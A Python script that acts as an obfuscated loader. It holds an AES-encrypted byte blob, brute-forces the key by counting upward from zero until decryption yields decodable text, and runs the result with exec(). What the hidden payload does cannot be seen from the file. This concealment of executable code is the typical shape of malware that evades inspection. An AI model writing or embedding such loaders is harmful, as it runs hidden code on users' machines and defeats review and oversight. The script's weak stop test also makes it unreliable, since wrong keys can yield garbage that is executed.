from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import webbrowser
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'}6Ii\xb4;\xc2\xcf\x8cUy\xca\xf3j\xd19-R\x1by\xa9{\t\xe9\xc2\x80\x1f\x00\x93\xfd_.`f?\xa7C\x8fPi<s\x05\xd2\xb0K\x92\x85\x16J/\xac\x19/"\xf1^\x9d\x95\x13\x16Y&q\x9bg\xb1\xb4\xa9\x9f#\xc3 \xb8\xd8]\x7f\x83\x83\xfd\xacw\x1bUW\xb6\xdd\xe3\xf1\xed=\xd9g\x0b\x86\x922W\x89\xfa\x03\xa2\x9a#\xa2F\x00Dq&\x8d\xe0\xc6\xb4\x95\xcc\x1f\x90FV*\x18\x98{\x1b%\xa3^d\x11z\xb7m\xe5\re\x00\x14\xd7\x88Rb\x06\x15\xb3\xf1\xf7\x11L_\x8b\xb3\x88\x98i\x9f\xc52$\xe0\x19\xed\xa8I\x12\x8bc\xfbW\xcau\xbd\xc8\xcc\xbf\xd4\xb5\xe6x\xf6\xf8\x01x\xb4e5\x89\xf0"\xb5\xb5\xe9#\x96f\x80\xf6\xf5\xccoF\x99\xd2\xf4\x89\\\xd32\x80\x99\xd9]6\')/L\xa2\xcf\xa6\x06\xf6\xac\x94\xdc\x9c\xfe\xf9{E?\x18eT\\njz\xef\xef\xb0\xe1\x8e\x034\xdb\x9b#\xc0\xb9\xe9\xd9\x8f\xe7lT`5^\x83\x18\xfb\xed\xd3\xe3\xdar\xc7\xbf\x13_\xdd\xfbm\x13\x13<\xb4\xa2\xcat\xfd\xc2\x9dL}\x8f\xf6V\xbfI\x87\xd59\xde>4\xaer\x16"DA\x96Z"+\x00t\xf89\x96\xf2\x80\x0c=Eq\x0e\xd2\xee\xecO\xdbht\x9f\x98\xfd5\xce\xce O\xc4\xc9\x83\xc3%8E\xa2&\x88\x1da4\xab\xd3\xa1\xa6\xca\xf0\x18\xed\x8ca\x11\xcb\x86Mo \x92\xdch\xec\x1f\xebo\xc9\xed\xac\xca\xc3\x14\x8c;\x07s,\xdf\xb4ekD\xd5b\xe8\xf2\xb6\xf5l\xff\xcby_\xc11\x11\xc9\x84\x94f7`\x14<\x91_6\xa0g\xcc\x17\x1e\\\xfc\x9e\xf5\xb5G\x0f\xc6\xdf\x8b\xf2\x8e\xe5\xa8{W'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
